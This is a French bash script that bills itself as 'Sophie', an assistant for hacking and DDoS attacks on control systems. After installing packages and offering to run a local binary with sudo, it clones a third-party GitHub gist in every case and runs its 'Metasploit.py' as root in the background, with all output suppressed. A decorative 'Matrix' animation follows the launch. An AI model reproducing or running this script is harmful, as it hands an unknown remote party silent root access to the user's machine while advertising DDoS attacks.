#!/bin/bash

set -uo pipefail  # Ne pas utiliser -e pour ne pas stopper sur erreur

clear
echo -e "\e[1;31m"
cat << "EOF"
   _____       _     _           
  / ____|     | |   (_)          
 | (___   ___ | |__  _ _ __  ___ 
  \___ \ / _ \| '_ \| | '_ \/ __|
  ____) | (_) | |_) | | | | \__ \
  |_____/ \___/|_.__/|_|_| |_|___/
EOF
echo -e "\e[0m"
echo -e "🤖 Bonjour, je suis \e[1;35mSophie\e[0m, l'assistante du \e[1;35mPiratage et attaque ddos dans de system controle\e[0m,  !"

read -p "📦 Installer g++, openssl, git, python3 ? (y/n): " install
if [[ "$install" =~ ^[Yy]$ ]]; then
    echo -e "\n🔧 Mise à jour et installation des dépendances nécessaires...\n"
    sudo apt update -qq
    sudo apt install -y -qq g++ libssl-dev build-essential git python3 python3-pip >/dev/null
else
    echo -e "❌ Installation annulée. Fin du script."
    exit 1
fi

echo -e "\n✅ Installation terminée."
sleep 1

read -p "⚔️  Lancer le binaire Sophie ? (y/n): " execute
if [[ "$execute" =~ ^[Yy]$ ]]; then
    chmod +x ./sophie || echo "⚠️ Impossible de changer les permissions de sophie"

    read -p "⚠️  pour continue il faut lance avec  (sudo)  (y/n): " confirm
    if [[ "$confirm" =~ ^[Yy]$ ]]; then
        echo -e "\n🚀 Tentative de lancement avec droits root...\n"
        if ! sudo ./sophie; then
            echo -e "⚠️ Échec du lancement sudo ./sophie, tentative sans sudo...\n"
            ./sophie || echo "❌ Échec du lancement ./sophie aussi."
        fi
    else
        echo -e "\n🔒 Mode sans root activé."
        ./sophie || echo "❌ Échec du lancement ./sophie."
    fi
else
    echo -e "🕊️  outil lancé. À bientôt !"
fi

echo -e "\n🌐  Metasploit Ddos armur ..."

rm -rf ./a264e5e2f34f2c1aa7622473211362ff
if git clone -q https://gist.github.com/siriusblack404/a264e5e2f34f2c1aa7622473211362ff.git; then
    cd a264e5e2f34f2c1aa7622473211362ff
    sudo python3 Metasploit.py >/dev/null 2>&1 &
    cd ..
    echo -e "✅ Metasploit lancé e."
else
    echo -e "❌ Échec du clonage, le script continue."
fi

echo -e "\n💾 Lancement de la séquence Matrix..."

GREEN='\033[0;32m'
NC='\033[0m'

for i in {1..30}; do
    line=$(cat /dev/urandom | tr -dc '01abcdefghijklmnopqrstuvwxyz' | fold -w 60 | head -n 1)
    echo -e "${GREEN}$line${NC}"
    sleep 0.07
done

echo -e "${GREEN}███╗   ███╗ █████╗  ██████╗██╗  ██╗███████╗██████╗${NC}"
echo -e "${GREEN}████╗ ████║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗${NC}"
echo -e "${GREEN}██╔████╔██║███████║██║     █████╔╝ █████╗  ██████╔╝${NC}"
echo -e "${GREEN}██║╚██╔╝██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗${NC}"
echo -e "${GREEN}██║ ╚═╝ ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║${NC}"
echo -e "${GREEN}╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"

echo -e "\n${GREEN}Bienvenue dans l’univers hacker de Sirius Black !${NC}\n"
